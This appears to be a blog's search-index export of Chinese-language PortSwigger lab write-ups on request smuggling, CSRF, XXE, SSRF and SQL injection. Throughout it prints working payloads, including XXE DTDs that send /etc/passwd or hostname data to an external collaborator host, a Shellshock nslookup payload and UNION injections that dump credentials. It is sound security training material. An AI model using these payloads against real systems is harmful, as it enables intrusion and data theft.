application/x-www-form-urlencoded Content-Length: 15 x=1 0 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP 请求走私，通过差异响应确认 CL.TE 漏洞 第一个请求使用了 Transfer-Encoding: chunked 标头来指示请求体的长度为分块编码形式，并设置长度为0，表示请求体为空。 第二个请求使用了 Content-Length 标头来指示请求体的长度为35个字节。 这两个请求放在了一起，会解析出两个不同的请求，其中第一个请求不包含请求体，而第二个请求包含了一个长度为35个字节的请求体。 POST / HTTP/1.1 Host: 0a6800d904fae8a2c5f918c700250023.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses HTTP 请求走私，通过差异响应确认 TE.CL 漏洞 第一个请求的数据块长度为 0x5e，即 94，后面跟着一个 POST 请求，其请求体为 x=1。 第二个请求的数据块长度为 0，表示这是最后一个数据块。 POST / HTTP/1.1 Host: 0a7b005103ea6bc6c04abe7a0021006d.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞 POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 37 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-Ignore: X 本地用户localhost放入后，Host标头又冲突了 POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X 将第二段请求，改为正常的请求包 POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= 删除用户： carlos POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability 利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞 POST / HTTP/1.1 Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 60 POST /admin HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 POST / HTTP/1.1 Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 删除用户carlos： POST / HTTP/1.1 Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 8. Exploiting HTTP request smuggling to reveal front-end request rewriting 利用 HTTP 请求走私来揭示前端请求重写 观察搜索功能看它是否反映了参数值search POST / HTTP/1.1 Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 124 Transfer-Encoding: chunked 0 POST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 200 Connection: close search=test 第一次请求标头的名称，用它来访问管理面板： POST / HTTP/1.1 Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-OhZACS-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1 更改走私的请求 URL 以删除用户carlos POST / HTTP/1.1 Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 166 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 X-OhZACS-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1 9. Exploiting HTTP request smuggling to capture other users’ requests 利用 HTTP 请求走私来捕获其他用户的请求 访问博客文章并发表评论，抓包请求 需要慢慢增加走私请求中 Content-Length 标头的值，直到捕获整个 cooki POST / HTTP/1.1 Host: 0a5f00f5030f2821c174b72d00c100e3.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 600 Cookie: session=enYe7PbIpOv50lcgDeOWdEO3Ymf6m7dq csrf=XsZYgcHX6NuQAkteJIBenpeAfd8nNMiY&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=comment+2 10. Exploiting HTTP request smuggling to deliver reflected XSS 利用 HTTP 请求走私来传递反射 XSS","tags":["靶场","HTTP 走私"],"categories":["网络安全"]},{"title":"portswigger 靶场之 CSRF 篇","path":"/2022/07/11/csrf/","content":"Cross-site request forgery (CSRF) All labs | Web Security Academy (portswigger.net) 1. 没有防御措施的 CSRF 漏洞 题目中已告知易受攻击的是电子邮件的更改功能，而目标是利用 csrf 漏洞更改受害者的电子邮件地址，最后给出了登录凭据：wiener:peter。 登录 wiener 用户——首先做的事是根据给定的登录凭据进行登录，点击 My account 登录，登录后就到了一个更改邮箱的界面，这时候然设置代理以便 burp 抓包。 burp 抓包——尝试输入test@test.ca，点击 update email，通过 burp 抓包，发送到 repeater 后关闭拦截，此时回到更改邮箱的界面发现电子邮件已被更改为test@test.ca 。 进行 csrf 攻击——因为 burp 有自动生成脚本的功能，右键 Generate CSRF PoC，进入界面后在选项一栏把自动提交脚本勾选上，这时候 burp 会自动提交表单不需要自己点击提交了。点击 regenerate 重新生成发现多了document.forms[0].submit();。 进行 csrf 攻击——把代码中的 emali 修改为testcsrf1@test.ca以便测试之用，接着 copyhtml，转到漏洞利用服务器，在 body 中放入 html，store 保存，点击 View exploit 查看漏洞，最后 Deliver to victim，传递给受害者即可成功 生成 CSRF PoC CSRF HTML 修改成功 2. token 验证取决于请求方法 登录 wiener 用户——依旧是账号密码进行登录，wiener:peter，然后在更改邮箱的界面输入test@test.ca进行抓包 改变请求方法——因为 POST 请求会对 token 验证（在没有 token 的情况下会 404），从而无法修改邮箱，而 GET 不需要。于是右键 burp 点击 Change request method，将请求方法从 POST 更改为 GET 在 POST 请求下删掉 token 会404 GET 请求下没有 token 进行 csrf 攻击在 burp 中右键生成 csrf poc，选项中把自动提交脚本选择上，代码中的 emali 修改为testcsrftoken1@test.ca，copy html，用 burp 的服务器托管脚本，粘贴到 body 中。最后点击&quot;Store&quot;，并发送给受害者，完成试验 成功修改了邮箱 3. token 验证取决于 token 的存在 在上一个关卡，请求改为 GET 是因为检查了 POST 方法是否允许我们删除 token，删除 token 后，POST 请求 404， 所以可以用 GET 方法进行绕过 在这一关中攻击者删除 token，返回 302。这说明 token 不存在请求便会通过，简单粗暴 右键生成 CSRF Poc，后续步骤和前面一致 token 删掉返会状态码 302 4. token 与用户会话无关 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 登录两个账户——把两个账户分别分别登陆，目标是从 wiener 那更改 carlos 的电子邮件地址 使用 firefox 登录账户 改变请求方法——拦截 wiener 的请求在 burp 中查看，删除 csrt token 的一个字符返回 404，请求方法改为 GET，依旧是 404 修改邮件拦截请求 根据前两个实验室，均以失败告终 从 carlos 用户中找到 CSRF Token——登录 carlos，在更改邮箱的界面打开“开发者工具”找到 CSRF Token，复制后在 burp 中粘贴到相应位置，返回 302 这说明虽然应用程序需要一个 token 处理请求，但不关心它是怎么来的。换言之，应用系统仅会验证 CSRF Token 的有效性，而不会验证该 Token 是否属于当前用户，也就是标题说的 Token 不会与用户会话绑定 进行 csrf 攻击——最后利用 burp 的 csrf poc 功能，复制 html 后需要回到攻击者 wiener，刷新 carlos 的网页来收集新的 token（token 随着请求的变化而变化）替换到 burp 中 5. token 绑定到非会话 cookie 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 测试 CSRF Token 和 CSRF Cookie 抓包 wiener 用户 ——发现 Cookie 中存在一个 csrfkey。删除 CSRF Token 的某个字符则返回 400。 查看 carlos 用户的 CSRF Token——从另一个用户查看 Cookie 是否相互绑定。登录另一个用户(carlos)，可以在火狐无痕窗口，查看 CSRF Token，粘贴到 wiener 用户的 burp，send 发送后 400。 查看 carlos 用户的 CSRFKey cookie——在 carlos 账户中，点开网络，点重新载入，找到 CSRFKey cookie。粘贴到 wiener 用户的 burp，send 发送后 302，这说明两者没有进行绑定的，可喜可贺。 **wiener 用户首页搜索框中 CSRFKey 参数注入 **——在 wiener 账户的首页发现有搜索框，输入“ceui”进行抓包处理，能看到搜索的关键词在 Set-Cookie 标头。因为搜索功能没有 CSRF 保护，所以可以轻而易举的注入 cookie。 将已知的 csrfKey cookie 注入给被攻击者 /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None # SameSite=None——显式设置 SameSite=None（一个新值），该值表示放弃对 Cookie 的 Same-Site 策略设置，通俗说就是“我不管了”。 抓包查看 Set-Cookie 标头 URL 编码 利用此漏洞将 cookie 注入受害者的浏览器 csrf 攻击——最后存储漏洞，单击“交付给受害者”。 在 wiener(攻击者) 用户的 burp 请求中右击生成 PoC 6. token 在 cookie 中重复 如图所示，应用程序只需验证在请求参数中提交的 Token 是否与 Cookie 中提交的值匹配 搜索，查看 Set-Cookie 标头中是否有搜索词 将虚假 CSRF Cookie 注入受害者浏览器的 URL 最后注入 cookie 并提交表单 7. Referer 验证取决于 header 是否存在 登录帐户，抓取“更新电子邮件”表单的请求 在 burp 中查看，发现出现了 Referer，删除则返回 302 即成功 在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的*来源地址*，同源检测（Origin 和 Referer 验证） 生成 PoC 网页返回 “Invalid referer header”，这是因为 Referer 的来源是 burp 禁止 Referer 标头，&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;，作用是控制页面发送给 server 的 referer 信息，告诉服务器端用户是从哪个页面来到当前网页的。 no-referrer： 所有请求不发送 referrer 更新电子邮件表单的请求 burp 右击生成 PoC 因为有 Referer 限制而无效 Referer 来源于 burp，这才导致错误 成功修改 8. Referer 验证失效的 CSRF 登录帐户，抓取“更新电子邮件”表单的请求 追加到 Referer 标头请求成功，这说明网站似乎接受任何包含预期的 Referer 标头 在 script 中编辑 JavaScript history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?0aac003b03b74a00c0510db300a200ff.web-security-academy.net&quot;) 在头部添Referrer-Policy: unsafe-url，是因为需要请求中包含完整的 URL ，以此来覆盖浏览器的默认配置（默认从 Referer 标头中删除查询字符串） 追加到 Referer 标头 history.pushState() 添加 history.pushState() 在漏洞利用服务器中","tags":["靶场","CSRF"],"categories":["网络安全"]},{"title":"Portswigger 靶场之 XML 外部实体 (XXE) 注入","path":"/2022/06/28/xml-external-entity-attack/","content":"All labs | Web Security Academy (portswigger.net) 1. Exploiting XXE using external entities to retrieve files 使用外部实体利用 XXE 来检索文件 检查库存功能用 burp 截断数据包，然后松手在 HTTP History 中查看请求，转到 Repeater。 往下看，当看到 XML 的时候，应该考虑 XXE 注入。接下来就是找到注入点，具体位置有两个，一个是 productId，另一个是 storeId。 在 XML 声明和元素 stockCheck 之间插入外部实体定义。 &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; # 定义了一个名为 xxe 的实体，它指向文件系统中的 /etc/passwd 文件。 2. Exploiting XXE to perform SSRF attacks 利用 XXE 执行 SSRF 攻击 依旧是抓包检查库存功能，会发现有一个包含 XML 的帖子请求。 声明一个外部实体，不再引用本地文件而是查看是否可以发送到 IP 地址169.254.169.254 Send 发送请求，从响应中得到目录，连续往下遍历目录，最后获得敏感信息。 3. Blind XXE with out-of-band interaction 带外交互的盲 XXE 访问产品页面，单击“检查库存”并在 Burp 中拦截请求。 定义外部实体，插入 Burp 的协作子域名。转到“子域名”选项卡，然后单击“Poll now”。 可以看到 DNS 和 HTTP 交互。它的作用是，确认我们可以让应用程序与攻击者控制的对话服务器，为带外渗透做好准备 &lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; ]&gt; 4. Blind XXE with out-of-band interaction via XML parameter entities 通过 XML 参数实体进行带外交互的盲 XXE 外带交互的盲 XXE 是通过利用 XML 解析器向==外部服务器（burp 子域）==发送数据，使得攻击者可以==通过外部服务器与目标系统进行交互==。 &lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;http://1hj71n3ymgjdmmtrt6ye3mqcf3lt9i.oastify.com&quot;&gt; %xxe; ]&gt; # 定义了一个名为 xxe 的参数实体，它指向一个远程 URL http://…… # 使用了 % 操作符来引用实体，%xxe --&gt; 表示引用实体xxe # XML 文档被解析时，实体引用（%xxe; ）将会被展开并替换为实体声明中的值（也就是远程 URL），而可能导致系统被攻击者控制的服务器接管。 Quote / 参考 盲XXE（Blind XXE），它可以在没有直接访问应用程序响应的情况下，仍能从应用程序中获取敏感信息。 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD 利用盲 XXE 使用恶意外部 DTD 泄露数据 &lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/?x=%file;'&gt;&quot;&gt; %eval; %exfil; # 定义了一个名为 file 的外部实体，它包含了 /etc/hostname 文件的内容。可以利用此实体来访问并泄露目标系统中的文件内容 # 这一行定义了一个名为 eval 的外部实体，它包含了一个实体声明 exfil，该实体可将 file 实体的内容发送到攻击者控制的服务器。exfil实体的定义包括一个URL，该URL包含攻击者控制的服务器地址和将file实体的内容作为查询参数的字符串。在这种情况下，exfil实体将文件内容发送到http://0abk7wm21os9liaqg27kek4ic9iz6o.oastify.com/，并将file实体的内容作为查询参数x的值。 # %eval; %exfil; 这两行将eval实体和exfil实体插入到XML文档中。攻击者可以将这些实体插入到一个合法的XML文档中，并发送给目标系统进行解析。在解析XML文档时，目标系统将解析eval实体，然后解析exfil实体，从而触发将file实体的内容发送到攻击者控制的服务器的行为。 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体 最后返回 Burp Collaborator client，会看到一些 DNS 和 HTTP 交互，特别关注 HTTP 交互，可能包含文件的内容。/etc/hostname &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a57006c0302b2d5c0e221d8013c0082.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; 6. Exploiting blind XXE to retrieve data via error messages 利用盲 XXE 通过错误消息检索数据 &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;&quot;&gt; %eval; %exfil; 将 DTD 文件保存在服务器上，单击“查看漏洞”并记下 URL；用 burp 截断检查库存的请求，定义外部实体，会看到一条包含文件内容错误消息 &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;https://exploit-0a42007304c1c092c003856801a900e4.exploit-server.net/exploit&quot;&gt; %xxe;]&gt; # 定义了一个名为 foo 的 DTD 声明，其中包含了一个名为 xxe的 外部实体。 # xxe 实体的定义包括一个 URL，该 URL 指向服务器上的一个文件，文件包含敏感信息。在这种情况下，可以将获取的信息发送到 https…… 7. Exploiting XInclude to retrieve files 利用 XInclude 检索文件 抓包检查库存功能，修改 productId 的值 &lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt; # 这个XML文档定义了一个名为foo的元素，并且通过XML命名空间定义了一个名为xi的前缀，它的命名空间是&quot;http://www.w3.org/2001/XInclude&quot;。然后，它使用了`xi:include`元素来指定要包含的内容，包括`parse`和`href`属性。 # parse属性指定了包含的文件是以文本方式解析的，而不是XML方式解析。href属性指定了要包含的文件的路径，这里是file:///etc/passwd，也就是本地系统上的/etc/passwd文件。由于该文件包含有关用户帐户的信息，因此攻击者可以使用这种技术来收集系统信息并进行其他攻击。 8. Exploiting XXE via image file upload 通过图像文件上传利用XXE 下载一个SVG 文件（注意不要太大），上传 SVG 文件，发表评论的时候抓包，修改 SVG 文件的内容 Expand / 拓展 SVG 文件是由 XML 构成的，因此可以使用 XML 的各种功能来嵌入数据或 payload 到 SVG 图像中。由于 SVG 图像可以包含文本、图形和脚本等元素，因此可以使用这些元素来嵌入payload &lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt; # 当SVG文件被处理时，xxe实体会被解析为文件/etc/hostname的内容，然后将该内容作为文本元素的内容插入到SVG图像中，从而显示该文件的内容。 9. Exploiting XXE to retrieve data by repurposing a local DTD 利用 XXE 通过重新调整本地 DTD 的用途来检索数据 抓包检查库存功能 &lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt; &lt;!ENTITY % ISOamso ' &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; '&gt; %local_dtd; ]&gt; # 定义名为“file”的实体，并将其设置为/etc/passwd文件的路径，然后通过将这个实体插入到另一个名为“eval”的实体中，最终触发了漏洞，导致可以读取系统上的/etc/passwd文件的内容。同时，攻击者也定义了一个名为“error”的实体，用于报告错误信息。","tags":["靶场","XXE"],"categories":["网络安全"]},{"title":"portswigger 靶场之 SSRF 篇","path":"/2022/06/20/ssrf/","content":"All labs | Web Security Academy (portswigger.net) 1. 针对本地服务器的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**更改 URL 来访问http://localhost/admin并删除用户carlos 分析： URL 浏览到 /admin 目录返回一个错误，指出该目录仅可从服务器本地使用，或对已登录的管理员可用。 找到库存检查功能，打开 burp 进行拦截并发送到 repeater，库存将发出与后端 API 通信的请求。在 burp 中观察到有个参数是stockApi，有 http 字样，判断为编码后 URL。通过 Ctrl+Shift+U 对 URL 解码后，能够看到库存检查功能的 URL 路径和端口号。 查看是否有应用程序在本地主机上运行，将stockApi值换为http://localhost，发送后显示成功，点开 burp 的 Render，能够看到网站页面上有Admin panel字样，说明进入了管理面板 在 Response 中搜索 admin，可看到Admin panel的路径是/admin，把路径添加到 stockApi 上后，继续在 Response 中搜索 carlos，可看到删除的路径是/admin/delete?username=carlos 删除 carlos：http://localhost/admin/delete?username=carlos，遵循 302 重定向 检查库存功能 对 URL 进行解码 访问本地 找到了删除的路径 返回查看成功 2. 针对另一个后端系统的基本 SSRF **易受攻击的参数是：**库存检查功能 **目标：**SSRF 扫 IP 并删除用户carlos 分析： 通过 burp suite 在库存检查功能处抓包，发送到Intruder，对 IP 地址的最后一位“添加有效载荷 §”，type 填 Number，From 1 To 255 Step 1，然后 Start attack。 攻击完后通过 Status 排序，找到不一致的发送到 Repeater，在最后面添加/admin 在 Response 中搜索 carlos，可看到删除的路径是admin/delete?username=carlos 对 URL 编码后发送，遵循 302 重定向，返回即可看到已成功http://192.168.0.18:8080/admin/delete?username=carlos 通过 python 3. 带有基于黑名单的输入滤波器的 SSRF 易受攻击的参数是： 库存检查功能 目标： 访问 http://localhost/admin 的管理界面并删除用户carlos 分析： 打开 burp 抓包，修改参数为http://localhost/失败了，然后修改为http://127.0.0.1也失败了，再次修改为http://127.1，因为会自动填充缺少的两位八位字节，点击发送发现渲染出来了 这说明，没有对127.1进行正则匹配（所以设置白名单比黑名单更好） 还可以把 IP 地址进行 16 进制编码或者 8 进制 16 进制 --&gt; 7F000001 10 进制 --&gt; 2130706433 后面加入/admin，发送后失败了在 burp 中右击Convert selection对 admin 进行编码，或者大小写绕过，最后找到路径直接删除用户即可 测试 http://127.1 大小写绕过 两次 URL 编码 4. 通过开放重定向漏洞旁路过滤器的 SSRF 要点： Open redirect 分析： 抓包库存检查功能和Next produst并发送到 Repeater，重命名为 Check stock、Next product 在 Next product 中通过测试 path 参数，观察到 path 参数被放置在Location响应标头中，Location 响应标头表示 URL 需要重定向页面 应用程序先验证 stockAPI 参数的 URL 是否在允许的域中，紧接着应用程序请求 URL，触发重定向，遵循重定向，向攻击者构造的内部 URL 发出请求 stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos 拦截 重定向 重定向到管理界面 重定向到删除 5. 带外检测的盲 SSRF 在加载产品页面时用 burp 抓包，找到 Referer 标头，开启 Collaborator client 把网址替换为 Referer 6. 带有基于白名单的输入滤波器的 SSRF 要点： 利用 URL 解析中的不一致性来绕过过滤器 步骤： 首先发出请求http://loaclhost，发现响应告诉我们主机名必须是stock.weliketoshop.net 使用@在主机名之前的 URL 中嵌入凭据，参数改为http://127.0.0.1@stock.weliketoshop.net 使用两次 URL 编码后的#使 @stock.weliketoshop.net 失效。#代表网页中的一个位置，位置的标识符 发出请求http://127.0.0.1%2523@stock.weliketoshop.net即可成功。后面步骤与之前面没有差别了 7. 盲目 SSRF 与壳冲击利用 **要点：**SSRF 在 Referer， UA 带 Shell shock payload 步骤： 从 BApp Store 安装“Collaborator Everywhere”扩展，把域名添加到 Burp，以便 Collaborator Everywhere 观察 回到浏览器，浏览产品页面后点击 return，如此反复，由此产生 HTTP 交互，回到 burp，观察 HTTP 请求中的 User-Agent，并发送到 Intruder 使用 Burp Collaborator 客户端，更改 Referer 标头，http://192.168.0.1:8080 IP 地址的最后一个八位字节，添加 § () &#123; :; &#125;; /usr/bin/nslookup $(whoami).yac7iwqg4tsdlyai7czxo0rrcii96y.oastify.com Payloads 窗口，将 payload 类型为 Numbers，1、255、1，开始攻击 攻击完成后，回到 Burp Collaborator 客户端，点击 Poll now，能够看到 DNS 交互和操作系统用户的名称 需要输入操作系统用户的名称即可成功 安装 添加域名 观察 UA 攻击 利用 python","tags":["靶场","SSRF"],"categories":["网络安全"]},{"title":"portswigger 靶场之 SQL 注入","path":"/2022/06/15/sql-injection/","content":"All labs | Web Security Academy (portswigger.net) WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据 目的为查看隐藏的数据，所有产品 URL 中输入单引号，查看是否存在漏洞，服务器返回一个错误，借以得知容易受到 SQL 注入攻击 URL 中输入'+OR+1=1-- （查询字符串中空格被编码成+号） 数据库执行的 SQL 查询则为 SELECT * FROM products WHERE category = ''or 1=1-- ' AND released = 1 通过'来闭合参数，-- 来注释后半部分 bp 允许绕过登录的 SQL 注入漏洞 目的为以管理员用户登录应用程序 尝试账号密码为admin。网页显示，Invalid username or password，无效的用户名或密码，故此不知道是用户名还是密码错误。 从实验室说明中查的用户名为administrator 在Username中输入any' or 1=1 -- ，密码随便写毕竟会被注释掉 用any'来闭合参数，or一个为真即可通过，-- 是 sql 的注释语法注释掉后面的密码 在Username中输入administrator'-- ，密码随便写毕竟会被注释掉 浏览器连上代理，在登录页面用 bp 抓包，修改其参数 SQL 注入 UNION 攻击，确定查询返回的列数 目的为查找列数为多少，两种方法，可以用order by和union ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序 UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 URL 中输入' order by 1-- ' order by 2-- ' order by 3-- 网站正常显示 直到输入了“ ' order by 4--”，服务器抛出了一个错误，这表明试图排序的列不存在，也就是说只有 3 列 URL 中输入' union select null-- ' union select null,null-- 服务器皆返回了一个错误，这表明不只有一两列存在 ' union select null,null,null-- 网站正常显示，这说明是有三列数据存在 在 bp 中 浏览器需要进行 URL 编码，在 bp 中 可以用快捷键 Ctrl + U 来为其添加 确定列数为 3 SQL 注入 UNION 攻击，查找包含文本的列 通过枚举' order by 数字--'得知总共有 3 列数据存在 然后在' union select null,'1',null-- 的参数中替换字符串数据借以得知与哪列相匹配 错误的话，说明不是字符串类型的 成功，数据类型是“字符串” 最后替换文中所给的字符串 SQL注入 UNION 攻击，从其他表中检索数据 检索所有用户名和密码，administrator 得知数据库包列名为users username password 通过联合查询查找空字符串，' union select null,null--得知可以返回两列 测试' union select '1','2'--得知两列为字符串类型 最后通过' union select username,password from users--得知账号密码登录即可 后台 SQL 查询为 select &amp; from products where category = 'Gifts' union select username,password from users-- ' AND released = 1 SQL注入UNION攻击，在单个列中检索多个值 用' order by'来迭代 ' order by 3服务器显示错误提示，得知列数为 2 通过 ' union select null,'a'-- 来看是否接收字符串类型 页面正常输出表示可以接受字符串类型 数据库 ' union select null,version()--——查询PostgreSQL数据库版本 网站返回结果，说明数据库是PostgreSQL ' union select null,@@version--——查询MySQL数据库版本 失败 在单个列中检索需要用到字符串的连接，PostgreSQL的连接为|| ' union select null,username ||'_'|| password from users-- administrator_9wif5hcpr46lfc99l2yi SQL注入攻击，查询 Oracle 上的数据库类型和版本 用' order by'来迭代找到列数 ' order by 3-- '500，实践证明列数为 2 -- Oracle 查询数据库版本 Oracle\tSELECT banner FROM v$version SELECT version FROM v$instance 在 URL 或者 bp 软件中输入' union select null,banner from v$version-- ' SQL注入攻击，在 MySQL 和 Microsoft 上查询数据库类型和版本 依然是 '+order+by+3--+两列 ' union select @@version,null-- SQL注入攻击，列出非 Oracle 数据库上的数据库内容 通过' union select null,null-- '查得是两列 其次确定每列的字段数据类型 查询数据库类型 PostgreSQL 查询数据库应为' union select version(),null-- '，查询结果为 200，说明数据库是PostgreSQL PostgreSQL SELECT * FROM information_schema.tables ELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 表 ' union select table_name,null from information_schema.tables-- '——查询数据库的表名 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_ 找到了users_squiqq 列 ' union select column_name,null from information_schema.columns where table_name='users_squiqq'-- ' username_fklyld password_vqihba 检索所有的用户名和密码 ' union select username_fklyld,password_vqihba from users_squiqq-- 找到 administrator 的密码为 kb1zf7n2k5jf1gxst3q8 SQL注入攻击，列出Oracle上的数据库内容 确定列数为 2 ，' union select null,null from dual-- 数据库 Oracle 查询需要加 from dual 查看每列的数据类型 ' union select 'a','b' from dual-- ，页面 200，表明是字符型 因为数据库是“Oracle” Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 Oracle 的数据表是 all_tables 通过搜索 all_tables Oracle 找到表的字段名是TABLE_NAME 找到包含用户密码的表的名字 ' union select TABLE_NAME,null from all_tables-- 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_得到USERS_EKARCY 找到包含用户密码的列的名字 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 all_tab_columns，这是一个数据表的名字；通过搜索 all_tab_columns Oracle找到表的字段名是COLUMN_NAME ' union select COLUMN_NAME,null from all_tab_columns where table_name = 'USERS_EKARCY'-- USERNAME_VYRGKY PASSWORD_TWCYAQ 最后查询用户名和密码登录即可 ' union select USERNAME_VYRGKY,PASSWORD_TWCYAQ from USERS_EKARCY-- administrator；q6jra0hcl8lu1hmjge4m 具有条件响应的盲 SQL 注入 目标为枚举管理员密码，以管理员用户登录。如果查询有结果，页面会显示“welcome back” 首先要确认参数容易受到 SQL 注入 在 cookie 中注入参数 welcome back --&gt; true ' and 1=1-- TrackingId=fL8CZZ0ptOt9cR8T' and 1=1--，前面参数一定是 true， 1=1 也是 true no welcome back --&gt; false TrackingId=fL8CZZ0ptOt9cR8T' and 1=0--，前面参数一定是 true， 1=0 是 false。true and false = false 服务器根据' and 1=1--（true）和' and 1=0--（false）做出不同响应，所以可以使用盲注来推断数据库中的内容 确认数据库中存在用户表“users” ' and (select 'x' from users limit 1) = 'x'-- 'x' = 'x' --&gt; true；返回 welcome back limit 子句用于限制 SELECT 语句中查询的数据的数量，limit 1，限制查询结果为 1 确认用户表中有用户名字段“administrator” ' and (select username from users where username='administrator') = 'administrator'-- 'administrator' = 'administrator' --&gt; true；返回 welcome back，说明 administrator 的用户名字段存在 找到管理员用户 administrator 的密码长度 ' and (select 'a' from users where username='administrator' and length(password)&gt;1)='a'-- 